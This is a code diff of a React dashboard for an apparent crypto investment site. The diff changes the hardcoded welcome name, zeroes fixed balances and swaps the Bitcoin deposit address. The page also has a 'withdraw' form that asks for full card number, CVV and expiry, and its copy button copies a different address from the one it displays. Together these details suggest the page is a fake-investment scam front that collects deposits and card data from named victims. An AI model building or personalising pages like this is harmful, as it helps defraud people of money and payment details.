@@ -2,10 +2,10 @@
 
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
-import { FaExchangeAlt, FaBalanceScale, FaBitcoin, FaChartLine, FaDollarSign, FaShoppingCart, FaArrowCircleDown, FaSignOutAlt, FaCopy, FaLock, FaCheckSquare, FaSquare, FaEthereum, FaApple } from "react-icons/fa";
+import { FaExchangeAlt, FaBalanceScale, FaBitcoin, FaChartLine, FaDollarSign, FaShoppingCart, FaArrowCircleDown, FaSignOutAlt, FaCopy, FaLock, FaCheckSquare, FaSquare } from "react-icons/fa";
 import { toast, ToastContainer } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
-import CreditCardType from "credit-card-type"; // Import credit card type detection library
+import CreditCardType from "credit-card-type";
 
 declare global {
   interface Window {
@@ -37,60 +37,24 @@ const UserDashboard2 = () => {
   const [withdrawWallet, setWithdrawWallet] = useState("");
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [withdrawCurrency, setWithdrawCurrency] = useState("USD");
-  const [withdrawMethod, setWithdrawMethod] = useState("wallet"); // New state for withdraw method
-  const [creditCardNumber, setCreditCardNumber] = useState(""); // New state for credit card number
-  const [cardholderName, setCardholderName] = useState(""); // New state for cardholder name
-  const [cvv, setCvv] = useState(""); // New state for CVV
-  const [expiryDate, setExpiryDate] = useState(""); // New state for expiry date
-  const [creditCardType, setCreditCardType] = useState<string | null>(null); // New state for credit card type
+  const [withdrawMethod, setWithdrawMethod] = useState("wallet");
+  const [creditCardNumber, setCreditCardNumber] = useState("");
+  const [cardholderName, setCardholderName] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [expiryDate, setExpiryDate] = useState("");
+  const [creditCardType, setCreditCardType] = useState<string | null>(null);
   const [showTimeoutPopup, setShowTimeoutPopup] = useState(false);
   const [password, setPassword] = useState("");
   const [saveDevice, setSaveDevice] = useState(false);
-  const [cryptoDetails, setCryptoDetails] = useState([
-    { name: "Bitcoin", symbol: "BTCUSD", price: 0, change: 0, icon: <FaBitcoin /> },
-    { name: "Ethereum", symbol: "ETHUSD", price: 0, change: 0, icon: <FaEthereum /> },
-    { name: "Ripple", symbol: "XRPUSD", price: 0, change: 0, icon: <FaApple /> },
-  ]);
-
-  useEffect(() => {
-    const fetchCryptoData = async () => {
-      try {
-        const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,ripple&vs_currencies=usd&include_24hr_change=true");
-        const data = await response.json();
-
-        setCryptoDetails((prevDetails) =>
-          prevDetails.map((crypto) => {
-            const apiKey = crypto.name.toLowerCase();
-            const updatedData = data[apiKey];
-            return updatedData
-              ? {
-                  ...crypto,
-                  price: updatedData.usd,
-                  change: updatedData.usd_24h_change,
-                }
-              : crypto;
-          })
-        );
-      } catch (error) {
-        console.error("Failed to fetch cryptocurrency data:", error);
-        toast.error("Failed to fetch cryptocurrency data.");
-      }
-    };
-
-    fetchCryptoData();
-    const interval = setInterval(fetchCryptoData, 10000); // Update every 10 seconds
-
-    return () => clearInterval(interval);
-  }, []);
 
   const router = useRouter();
 
-  const profit = 4215.00;
-  const totalInvestment = 5300.00;
-  const totalBalance = 9515.00;
+  const profit = 0.00;
+  const totalInvestment = 0.00;
+  const totalBalance = 0.00;
 
   const getCreditCardIcon = (type: string | null): string => {
-    const normalizedType = type?.toLowerCase().replace(" ", "-") || ""; // Normalize type or fallback to an empty string
+    const normalizedType = type?.toLowerCase().replace(" ", "-") || "";
 
     const iconMap: Record<string, string> = {
       visa: "https://img.icons8.com/color/48/000000/visa.png",
@@ -99,9 +63,10 @@ const UserDashboard2 = () => {
       discover: "https://img.icons8.com/color/48/000000/discover.png",
     };
 
-    return iconMap[normalizedType] || "https://img.icons8.com/color/48/000000/generic-card.png"; // Always return a valid URL
+    return iconMap[normalizedType] || "https://img.icons8.com/color/48/000000/generic-card.png";
   };
 
+  // Initialize TradingView widget
   useEffect(() => {
     if (typeof window !== "undefined") {
       const scriptId = "tradingview-widget-script";
@@ -110,11 +75,12 @@ const UserDashboard2 = () => {
       const initializeWidget = () => {
         const container = document.getElementById(containerId);
         if (window.TradingView && container) {
+          container.innerHTML = ""; // Clear any existing content
           new window.TradingView.widget({
             container_id: containerId,
             autosize: true,
-            symbol: "BITSTAMP:BTCUSD", // Ensure the symbol is valid
-            interval: "D", // Daily interval
+            symbol: "BITSTAMP:BTCUSD",
+            interval: "D",
             timezone: "Etc/UTC",
             theme: darkMode ? "dark" : "light",
             style: "1",
@@ -123,11 +89,9 @@ const UserDashboard2 = () => {
             enable_publishing: false,
             allow_symbol_change: true,
             save_image: false,
-            hide_top_toolbar: false, // Show the top toolbar for better interaction
+            hide_top_toolbar: false,
             backgroundColor: "transparent",
           });
-        } else {
-          console.error("TradingView is not available or container is missing");
         }
       };
 
@@ -137,14 +101,14 @@ const UserDashboard2 = () => {
         script.src = "https://s3.tradingview.com/tv.js";
         script.async = true;
         script.onload = () => {
-          setTimeout(initializeWidget, 100); // Add a slight delay to ensure the DOM is fully rendered
+          setTimeout(initializeWidget, 100);
         };
         script.onerror = () => {
           console.error("Failed to load TradingView script");
         };
         document.body.appendChild(script);
       } else {
-        setTimeout(initializeWidget, 100); // Add a slight delay to ensure the DOM is fully rendered
+        setTimeout(initializeWidget, 100);
       }
     }
   }, [darkMode]);
@@ -154,7 +118,7 @@ const UserDashboard2 = () => {
     if (!savedDevice) {
       const timeout = setTimeout(() => {
         setShowTimeoutPopup(true);
-      }, 5000); // 5 seconds timeout
+      }, 5000);
 
       return () => clearTimeout(timeout);
     }
@@ -167,7 +131,7 @@ const UserDashboard2 = () => {
 
   const handleCopyWallet = () => {
     navigator.clipboard.writeText("bc1q5j6fnc2dldugvge7hff54pf2rw6ej5rvxkjpgr");
-    // bc1q23ldy4unkh6wggxunnnjzs0dewsuk53dahd804
+    // bc1qzpvj8e984mwlxfwyca9glvgd7qn9qhlqsqj6xl
     toast.success("Wallet address copied to clipboard");
   };
 
@@ -268,7 +232,7 @@ const UserDashboard2 = () => {
     <div className={`min-h-screen p-8 pb-20 sm:p-20 font-[family-name:var(--font-geist-sans)] ${darkMode ? "dark" : ""}`}>
       <ToastContainer />
       <header className="flex flex-col items-center sm:items-start mb-4 w-full">
-        <h1 className="text-4xl font-bold text-black dark:text-white">Welcome Stanley Petrus</h1>
+        <h1 className="text-4xl font-bold text-black dark:text-white">Welcome David</h1>
         <div className="flex gap-4 mt-4">
           <button
             className="border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center bg-green-500 text-white gap-2 hover:bg-green-600 text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
@@ -295,7 +259,7 @@ const UserDashboard2 = () => {
           <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
             <FaExchangeAlt className="text-2xl mb-2 text-primary" />
             <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">Transactions</h3>
-            <p className="text-black dark:text-white">3</p>
+            <p className="text-black dark:text-white">0</p>
           </div>
           <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
             <FaBalanceScale className="text-2xl mb-2 text-primary" />
@@ -305,7 +269,7 @@ const UserDashboard2 = () => {
           <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
             <FaBitcoin className="text-2xl mb-2 text-primary" />
             <h3 className="text-xl font-semibold mb-2 text-black dark:text-white">BTC Balance</h3>
-            <p className="text-black dark:text-white">0.092 BTC</p>
+            <p className="text-black dark:text-white">0.000000 BTC</p>
           </div>
           <div className="card bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md w-full">
             <FaChartLine className="text-2xl mb-2 text-primary" />
@@ -318,26 +282,17 @@ const UserDashboard2 = () => {
             <p className="text-black dark:text-white">${totalInvestment.toFixed(2)}</p>
           </div>
         </div>
-        <section className="crypto-cards mt-8 w-full">
-          <h2 className="text-3xl font-bold mb-6 text-black dark:text-white">Real-Time Cryptocurrency Values</h2>
-          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-            {cryptoDetails.map((crypto) => (
-              <div
-                key={crypto.symbol}
-                className={`card p-6 rounded-lg shadow-md ${
-                  crypto.change >= 0 ? "bg-green-100 dark:bg-green-800" : "bg-red-100 dark:bg-red-800"
-                }`}
-              >
-                <div className="flex items-center gap-2 mb-2">
-                  {crypto.icon}
-                  <h3 className="text-xl font-semibold text-black dark:text-white">{crypto.name}</h3>
-                </div>
-                <p className="text-black dark:text-white">Price: ${crypto.price.toFixed(2)}</p>
-                <p className={`text-black dark:text-white ${crypto.change >= 0 ? "text-green-500" : "text-red-500"}`}>
-                  Change: {crypto.change.toFixed(2)}%
-                </p>
+        <section className="trading-view-chart mt-8 w-full">
+          <h2 className="text-3xl font-bold mb-6 text-black dark:text-white">Bitcoin Live Chart</h2>
+          <div className="bg-white dark:bg-gray-800 p-4 rounded-lg shadow-lg">
+            <div 
+              id="tradingview_chart" 
+              className="w-full h-96 min-h-[400px]"
+            >
+              <div className="flex items-center justify-center h-full text-gray-500">
+                Loading TradingView Chart...
               </div>
-            ))}
+            </div>
           </div>
         </section>
         <section className="widgets mt-8 w-full grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
@@ -367,7 +322,7 @@ const UserDashboard2 = () => {
             <h2 className="text-2xl font-bold mb-4 text-black">Buy Bitcoin</h2>
             <p className="mb-4 text-black">Send Bitcoin to the following wallet address:</p>
             <p className="mb-4 font-mono text-black flex items-center gap-2 cursor-pointer" onClick={handleCopyWallet}>
-              bc1q23ldy4unkh6wggxunnnjzs0dewsuk53dahd804
+              bc1qzpvj8e984mwlxfwyca9glvgd7qn9qhlqsqj6xl
               <FaCopy className="text-lg" />
             </p>
             <div className="flex justify-end gap-4">
